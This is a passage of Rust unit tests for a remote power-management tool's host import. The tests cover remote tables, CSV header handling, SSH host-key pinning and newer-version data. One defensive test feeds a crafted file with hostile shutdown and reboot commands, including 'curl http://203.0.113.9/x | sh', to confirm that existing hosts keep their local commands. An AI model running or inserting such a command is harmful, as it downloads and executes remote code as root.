        assert_eq!(s.remote_changed, vec!["Lab-PC"], "pi -> root");
        assert_eq!(lab.port, Some(2222));
        assert_eq!(lab.reboot_command.as_deref(), Some("/sbin/reboot"));
        assert!(lab.extra.contains_key("future"));
        assert!(c.hosts[0].remote.is_none());
    }

    #[test]
    fn structured_imports_replace_the_remote_table_as_a_whole() {
        let mut c = remote_cfg();
        let json = r#"[{"name":"Lab-PC","mac":"AA:BB:CC:DD:EE:FF","remote":{"kind":"windows","user":"lab\\admin"}},
                       {"name":"NAS","mac":"00:11:22:33:44:55","notes":"no remote key"},
                       {"name":"New","mac":"02:00:00:00:00:09","remote_kind":"ssh"}]"#;
        let s = import(&mut c, json.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(s.added, vec!["New"]);
        let lab = c.hosts[1].remote.clone().unwrap();
        assert_eq!(lab.kind, RemoteKind::Windows);
        assert_eq!(lab.user.as_deref(), Some(r"lab\admin"));
        assert_eq!(lab.host_key, None);
        assert!(lab.extra.is_empty());
        // Cross review X1: the power command overrides are this PC's, never the file's (the
        // file had none here, so nothing is reported).
        assert_eq!(lab.reboot_command.as_deref(), Some("/sbin/reboot"));
        assert!(s.commands_kept.is_empty() && s.commands_imported.is_empty());
        // A record without `remote` keeps the host's table.
        assert_eq!(
            c.hosts[0].remote.as_ref().unwrap().kind,
            RemoteKind::Windows
        );
        // An unknown `remote_kind` key in JSON is just an unknown key (not a CSV column).
        let new = c.hosts.iter().find(|h| h.name == "New").unwrap();
        assert!(new.remote.is_none());
        assert!(new.extra.contains_key("remote_kind"));
        // Invalid remote tables are refused per record.
        let bad = r#"[{"name":"X","mac":"02:00:00:00:00:0A","remote":{"kind":"ssh","port":0}},
                      {"name":"Y","mac":"02:00:00:00:00:0B","remote":{"user":"x"}}]"#;
        let data = parse_import(bad.as_bytes(), Some(Format::Json), None).unwrap();
        assert!(matches!(
            &data.records[0].host,
            Err(RecordError::Fields { errors, .. }) if errors[0].field == Field::SshPort
        ));
        assert!(matches!(
            &data.records[1].host,
            Err(RecordError::Malformed { .. })
        ));
        // Replace mode reports the removed hosts, whose secrets the caller then forgets.
        let before = remote_cfg();
        use crate::secret::{MemoryBackend, SecretBackend, SecretStore};
        let backend = std::sync::Arc::new(MemoryBackend::new());
        let secrets = SecretStore::with_backend(backend.clone(), crate::secret::TARGET_PREFIX);
        for h in &before.hosts {
            backend
                .write(
                    &secrets.target(h.id, crate::secret::SecretKind::Login),
                    "",
                    "pw",
                )
                .unwrap();
        }
        let mut after = before.clone();
        let s = import(
            &mut after,
            r#"[{"name":"NAS","mac":"00:11:22:33:44:55"}]"#.as_bytes(),
            None,
            &ImportOptions {
                mode: ImportMode::Replace,
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(s.removed, vec!["Lab-PC"]);
        assert_eq!(
            crate::secret::forget_removed_hosts(&secrets, &before, &after),
            1
        );
        assert!(
            secrets
                .has(before.hosts[0].id, crate::secret::SecretKind::Login)
                .unwrap()
        );
    }

    /// Review M4 (repro r5): generic inventory headers (`User`, `ユーザー名`, `Remote`, `sudo`,
    /// `keyfile`, `hostkey`, `Management address`) behave as in v0.1: ignored columns, the
    /// rows import unchanged.
    #[test]
    fn review_m4_generic_csv_headers_are_ignored() {
        for csv in [
            "name,mac,user\r\nPC-1,02:00:00:00:00:01,Tanaka\r\nPC-2,02:00:00:00:00:02,Suzuki\r\n",
            "名前,MACアドレス,ユーザー名,Remote\r\nPC-1,02:00:00:00:00:01,田中,yes\r\nPC-2,02:00:00:00:00:02,鈴木,no\r\n",
            "name,mac,username,sudo,keyfile,hostkey,Management Address,リモート管理\r\nPC-1,02:00:00:00:00:01,t,yes,k,h,10.0.0.1,あり\r\nPC-2,02:00:00:00:00:02,s,no,,,,\r\n",
        ] {
            let data = parse_import(csv.as_bytes(), Some(Format::Csv), None).unwrap();
            assert_eq!(data.records.len(), 2, "{csv}");
            for r in &data.records {
                let h = r.host.as_ref().unwrap_or_else(|e| panic!("{csv}: {e:?}"));
                assert!(h.remote.is_none());
                assert!(
                    !r.present
                        .iter()
                        .any(|p| p.starts_with("remote") || p.starts_with("ssh"))
                );
            }
            assert!(data.warnings.iter().any(|w| w.contains("ignored")), "{csv}");
            let mut cfg = Config::default();
            let s = import(
                &mut cfg,
                csv.as_bytes(),
                None,
                &ImportOptions {
                    format: Some(Format::Csv),
                    ..ImportOptions::default()
                },
            )
            .unwrap();
            assert_eq!(s.added.len(), 2, "{csv}");
        }
        // The specific columns without a remote_kind column are ignored too (with a note).
        let data = parse_import(
            "name,mac,remote_user,ssh_port,管理用アドレス\r\nPC-1,02:00:00:00:00:01,pi,22,10.0.0.1\r\n"
                .as_bytes(),
            Some(Format::Csv),
            None,
        )
        .unwrap();
        assert!(data.records[0].host.as_ref().unwrap().remote.is_none());
        assert!(
            data.warnings
                .iter()
                .any(|w| w.contains("needs a remote_kind column")),
            "{:?}",
            data.warnings
        );
        // With the kind column, the Japanese aliases work.
        let data = parse_import(
            "name,mac,remote_kind,管理用アドレス,鍵ファイル\r\nPC-1,02:00:00:00:00:01,ssh,100.64.0.9,C:\\k\\id\r\n"
                .as_bytes(),
            Some(Format::Csv),
            None,
        )
        .unwrap();
        let r = data.records[0]
            .host
            .as_ref()
            .unwrap()
            .remote
            .clone()
            .unwrap();
        assert_eq!(
            r.address.map(|a| a.to_string()).as_deref(),
            Some("100.64.0.9")
        );
        assert_eq!(
            r.key_file.as_deref(),
            Some(std::path::Path::new(r"C:\k\id"))
        );
    }

    /// Review M2: a matched host keeps its pinned host key for the same server; the file's
    /// key applies only when the endpoint changed (stored passwords are then not usable).
    #[test]
    fn review_m2_imports_keep_the_local_host_key_of_the_same_server() {
        const OTHER: &str =
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKrOJm1dz5vWoZxZWq6YEoJmD2d2zSJ8VeyUdTqWRqf";
        let base = remote_cfg();
        let lab_id = base.hosts[1].id;
        let pin = |c: &Config| {
            c.get(lab_id)
                .and_then(|h| h.remote.as_ref())
                .and_then(|r| r.host_key.clone())
        };
        // Same kind / address / port, another key (a colleague's export or a crafted file).
        for mode in [ImportMode::Merge, ImportMode::Replace] {
            let mut c = base.clone();
            let json = format!(
                r#"[{{"name":"Lab-PC","mac":"AA:BB:CC:DD:EE:FF","remote":{{"kind":"ssh","user":"pi","port":2222,"host_key":"{OTHER}"}}}}]"#
            );
            let s = import(
                &mut c,
                json.as_bytes(),
                None,
                &ImportOptions {
                    mode,
                    ..ImportOptions::default()
                },
            )
            .unwrap();
            assert_eq!(pin(&c).as_deref(), Some(ED25519), "{mode:?}");
            assert_eq!(s.host_keys_kept, vec!["Lab-PC"]);
            assert!(s.remote_changed.is_empty());
        }
        // The same key in another notation (comment) is not reported.
        let mut c = base.clone();
        let json = format!(
            r#"[{{"name":"Lab-PC","mac":"AA:BB:CC:DD:EE:FF","remote":{{"kind":"ssh","user":"pi","port":2222,"host_key":"{ED25519} root@lab"}}}}]"#
        );
        let s = import(&mut c, json.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert!(s.host_keys_kept.is_empty());
        assert_eq!(pin(&c).as_deref(), Some(ED25519));
        // Another port (= another server as far as the pin is concerned): review R6, neither
        // the file's key nor the old one; the next connection asks to confirm the new one.
        let mut c = base.clone();
        let json = format!(
            r#"[{{"name":"Lab-PC","mac":"AA:BB:CC:DD:EE:FF","remote":{{"kind":"ssh","user":"pi","port":22,"host_key":"{OTHER}"}}}}]"#
        );
        let s = import(&mut c, json.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(pin(&c), None);
        assert!(s.host_keys_kept.is_empty());
        assert_eq!(s.host_keys_cleared, vec!["Lab-PC"]);
        assert_eq!(s.remote_changed, vec!["Lab-PC"]);
        // Another address without a key in the file (CSV keeps the local cell): the old key
        // does not belong to the new server either.
        let mut c = base.clone();
        let csv = "name,mac,remote_kind,remote_address,ssh_port\nLab-PC,AA:BB:CC:DD:EE:FF,ssh,192.0.2.99,2222\n";
        let s = import(
            &mut c,
            csv.as_bytes(),
            None,
            &ImportOptions {
                format: Some(Format::Csv),
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert_eq!(pin(&c), None, "{s:?}");
        assert_eq!(s.host_keys_cleared, vec!["Lab-PC"]);
        // Unchanged records change nothing and report nothing.
        let mut c = base.clone();
        let bytes = export(
            &base,
            &ExportOptions {
                format: Format::Json,
                include_settings: false,
            },
        )
        .unwrap();
        let s = import(&mut c, &bytes, None, &ImportOptions::default()).unwrap();
        assert_eq!(c, base);
        assert!(s.remote_changed.is_empty() && s.host_keys_kept.is_empty());
    }

    /// Cross review X1: a file (a colleague's export, a tampered one) cannot set or change the
    /// SSH power commands of a host that is already here; they run as root with the stored
    /// sudo password. Added hosts bring theirs, and the summary says so.
    #[test]
    fn x1_imports_never_change_the_power_commands_of_existing_hosts() {
        let base = remote_cfg();
        let lab_id = base.hosts[1].id;
        let nas_id = base.hosts[0].id;
        let commands = |c: &Config, id| {
            let r = c.get(id).and_then(|h| h.remote.clone()).unwrap();
            (r.reboot_command, r.shutdown_command)
        };
        let evil = r#""reboot_command":"/bin/sh /tmp/x","shutdown_command":"curl http://203.0.113.9/x | sh""#;
        for mode in [ImportMode::Merge, ImportMode::Replace] {
            let mut c = base.clone();
            // Same endpoint (the stored password stays usable) and a Windows host turned SSH.
            let json = format!(
                r#"[{{"name":"Lab-PC","mac":"AA:BB:CC:DD:EE:FF","remote":{{"kind":"ssh","user":"pi","port":2222,{evil}}}}},
                    {{"name":"NAS","mac":"00:11:22:33:44:55","remote":{{"kind":"ssh",{evil}}}}},
                    {{"name":"New NAS","mac":"02:00:00:00:00:0E","remote":{{"kind":"ssh",{evil}}}}},
                    {{"name":"New PC","mac":"02:00:00:00:00:0F","remote":{{"kind":"windows"}}}}]"#
            );
            let opts = ImportOptions {
                mode,
                ..ImportOptions::default()
            };
            let s = preview(&c, json.as_bytes(), None, &opts).unwrap();
            assert_eq!(s.commands_kept, vec!["Lab-PC", "NAS"], "{mode:?}");
            assert_eq!(s.commands_imported, vec!["New NAS"], "{mode:?}");
            let s2 = import(&mut c, json.as_bytes(), None, &opts).unwrap();
            assert_eq!(s, s2, "the preview says what the import does");
            assert_eq!(
                commands(&c, lab_id),
                (Some("/sbin/reboot".to_owned()), None),
                "{mode:?}: the local override stays"
            );
            assert_eq!(
                commands(&c, nas_id),
                (None, None),
                "{mode:?}: none here, none set"
            );
            let new = c.hosts.iter().find(|h| h.name == "New NAS").unwrap();
            assert_eq!(
                new.remote.as_ref().unwrap().shutdown_command.as_deref(),
                Some("curl http://203.0.113.9/x | sh")
            );
        }
        // The same commands (an export of this config) report nothing; blank values count as
        // none.
        let mut c = base.clone();
        let json = r#"[{"name":"Lab-PC","mac":"AA:BB:CC:DD:EE:FF","remote":{"kind":"ssh","user":"pi","port":2222,"reboot_command":" /sbin/reboot ","shutdown_command":"  "}}]"#;
        let s = import(&mut c, json.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert!(s.commands_kept.is_empty(), "{s:?}");
        assert_eq!(
            commands(&c, lab_id),
            (Some("/sbin/reboot".to_owned()), None)
        );
        // CSV has no command columns: a new SSH host from CSV has none, and existing ones keep
        // theirs silently.
        let mut c = base.clone();
        let csv =
            "name,mac,remote_kind\r\nLab-PC,AA:BB:CC:DD:EE:FF,ssh\r\nX,02:00:00:00:00:0D,ssh\r\n";
        let s = import(
            &mut c,
            csv.as_bytes(),
            None,
            &ImportOptions {
                format: Some(Format::Csv),
                ..ImportOptions::default()
            },
        )
        .unwrap();
        assert!(s.commands_kept.is_empty() && s.commands_imported.is_empty());
        assert_eq!(commands(&c, lab_id).0.as_deref(), Some("/sbin/reboot"));
    }

    /// Follow-up to review m9: a host whose remote table comes from a newer version
    /// (`kind = "ipmi"`, `sudo = "doas"`) survives export → import in every format. TOML /
    /// JSON carry the table (the host is not managed here, with a warning) instead of refusing
    /// the record; CSV exports such a host with empty remote cells and keeps the table of the
    /// matched host.
    #[test]
    fn newer_version_remote_tables_survive_export_and_import() {
        let text = r#"schema_version = 1
[[hosts]]
id = "5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44"
name = "BMC"
mac = "02:00:00:00:00:01"
address = "10.0.0.9"
[hosts.remote]
kind = "ipmi"
user = "admin"
cipher = 3

[[hosts]]
id = "9d7e2b10-8c4f-4a36-b1e2-6f3a0c5d7e91"
name = "BSD"
mac = "02:00:00:00:00:02"
[hosts.remote]
kind = "ssh"
sudo = "doas"

[[hosts]]
id = "1e9a5b2c-0000-4000-8000-00000000000a"
name = "PC"
mac = "02:00:00:00:00:03"
[hosts.remote]
kind = "windows"
"#;
        let (base, _) = Config::from_toml(text).unwrap();
        assert!(base.hosts[0].unsupported_remote().is_some());
        assert!(base.hosts[1].unsupported_remote().is_some());
        let unsupported = |w: &[String]| {
            w.iter()
                .filter(|w| w.contains("not supported by this version"))
                .count()
        };
        for format in [Format::Toml, Format::Json] {
            let bytes = export_as(&base, format);
            let exported = String::from_utf8_lossy(&bytes);
            assert!(
                exported.contains("ipmi") && exported.contains("doas"),
                "{format}: {exported}"
            );
            let data = parse_import(&bytes, None, None).unwrap();
            assert!(data.records.iter().all(|r| r.host.is_ok()), "{format}");
            assert_eq!(
                unsupported(&data.warnings),
                2,
                "{format}: {:?}",
                data.warnings
            );
            assert!(
                data.warnings
                    .iter()
                    .any(|w| w.starts_with("hosts[0]:") && w.contains(r#"kind = "ipmi""#)),
                "{format}: {:?}",
                data.warnings
            );
            // Another PC (empty config): added, not managed, table kept as it is.
            let mut fresh = Config::default();
            let s = import(&mut fresh, &bytes, None, &ImportOptions::default()).unwrap();
            assert_eq!(s.added.len(), 3, "{format}");
            assert!(s.skipped.is_empty(), "{format}");
            assert_eq!(unsupported(&s.warnings), 2, "{format}");
            assert_eq!(fresh.hosts, base.hosts, "{format}");
            assert!(fresh.hosts[0].remote.is_none());
            // ...and the result is a config.toml the next load reads the same way.
            let saved = fresh.to_toml_checked().unwrap();
            let (again, notes) = Config::from_toml(&saved).unwrap();
            assert_eq!(again.hosts, base.hosts, "{format}");
            assert_eq!(notes.len(), 2, "{format}: {notes:?}");
            // The same config (merge and replace): nothing changes.
            for mode in [ImportMode::Merge, ImportMode::Replace] {
                let mut c = base.clone();
                let opts = ImportOptions {
                    mode,
                    ..ImportOptions::default()
                };
                let s = import(&mut c, &bytes, None, &opts).unwrap();
                assert_eq!(c, base, "{format} {mode:?}");
                assert_eq!(s.unchanged.len(), 3, "{format} {mode:?}");
            }
        }
        // A record with a usable table replaces the kept one (like any `remote` key)...
        let mut c = base.clone();
        let json = r#"[{"name":"BMC","mac":"02:00:00:00:00:01","remote":{"kind":"windows"}}]"#;
        import(&mut c, json.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert_eq!(c.hosts[0].remote_kind(), Some(RemoteKind::Windows));
        assert!(!c.hosts[0].extra.contains_key("remote"));
        // ...and a newer version's table replaces a usable one (the host is then unmanaged).
        let json = r#"[{"name":"PC","mac":"02:00:00:00:00:03","remote":{"kind":"ipmi"}}]"#;
        import(&mut c, json.as_bytes(), None, &ImportOptions::default()).unwrap();
        assert!(c.hosts[2].remote.is_none());
        assert_eq!(
            c.hosts[2].unsupported_remote().unwrap()["kind"].as_str(),
            Some("ipmi")
        );
        // Only unknown words are tolerated (as in config.toml): a mistyped known kind, a
        // missing kind, a bad value or a bad record stays invalid.
        let bad = r#"[{"name":"X","mac":"02:00:00:00:00:0A","remote":{"kind":"Windows"}},
                      {"name":"Y","mac":"02:00:00:00:00:0B","remote":{"user":"x"}},
                      {"name":"Z","mac":"02:00:00:00:00:0C","remote":{"kind":"ssh","port":"x"}},
                      {"name":"W","mac":"zz","remote":{"kind":"ipmi"}}]"#;
        let data = parse_import(bad.as_bytes(), Some(Format::Json), None).unwrap();
        for r in &data.records {
            assert!(
                matches!(r.host, Err(RecordError::Malformed { .. })),
                "{}: {:?}",
                r.location,
                r.host
            );
        }
        assert_eq!(unsupported(&data.warnings), 0);
        let bad = "[[hosts]]\nname = \"W\"\nmac = \"zz\"\n[hosts.remote]\nkind = \"ipmi\"\n";
        let data = parse_import(bad.as_bytes(), Some(Format::Toml), None).unwrap();
        assert!(matches!(
            data.records[0].host,
            Err(RecordError::Malformed { .. })
        ));

        // CSV: no place for the table. Such hosts have empty remote cells...
        let bytes = export_as(&base, Format::Csv);
        let text = String::from_utf8(bytes.clone()).unwrap();
        assert!(!text.contains("ipmi") && !text.contains("doas"), "{text}");
        for row in text.lines().skip(1).take(2) {
            assert!(row.ends_with(",,,,,,,"), "{row}");
        }
        // ...and importing them onto the same hosts changes nothing (the table stays).
        let opts = |mode| ImportOptions {
            mode,
            format: Some(Format::Csv),
            ..ImportOptions::default()
        };
        for mode in [ImportMode::Merge, ImportMode::Replace] {
            let mut c = base.clone();
            let s = import(&mut c, &bytes, None, &opts(mode)).unwrap();
            assert_eq!(c, base, "csv {mode:?}");
            assert!(s.skipped.is_empty() && s.warnings.is_empty(), "{s:?}");
        }
        // A new host from CSV has no table; a known kind replaces a kept table.
        let mut fresh = Config::default();
        import(&mut fresh, &bytes, None, &opts(ImportMode::Merge)).unwrap();
        assert!(fresh.hosts[0].remote.is_none() && fresh.hosts[0].extra.is_empty());
        let csv = "id,name,mac,remote_kind,remote_user\r\n5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44,BMC,02:00:00:00:00:01,ssh,root\r\n";
        let mut c = base.clone();
        import(&mut c, csv.as_bytes(), None, &opts(ImportMode::Merge)).unwrap();
        assert_eq!(c.hosts[0].remote_kind(), Some(RemoteKind::Ssh));
        assert!(!c.hosts[0].extra.contains_key("remote"));
        let saved = c.to_toml_checked().unwrap();
        assert_eq!(saved.matches("ipmi").count(), 0, "{saved}");
    }
}
